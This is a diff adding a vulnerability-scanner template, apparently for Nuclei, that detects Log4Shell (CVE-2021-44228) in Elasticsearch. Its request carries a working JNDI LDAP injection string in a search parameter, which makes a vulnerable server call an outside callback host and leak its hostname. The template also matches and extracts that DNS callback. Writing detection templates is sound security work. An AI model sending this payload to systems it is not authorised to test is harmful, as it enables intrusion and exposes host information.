@@ -1,0 +1,36 @@
+id: elasticsearch-log4j
+
+info:
+  name: Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE), by logging a certain string.
+  author: c-sh0
+  severity: high
+  description: Log4Shell elasticsearch detection 
+  reference:
+    - https://github.com/elastic/elasticsearch/issues/81618
+    - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
+  tags: rce,jndi,log4j,elastic,elasticsearch
+
+requests:
+  - raw:
+      - |
+        GET /_search?source=${jndi:ldap://${hostName}.{{interactsh-url}}/x} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
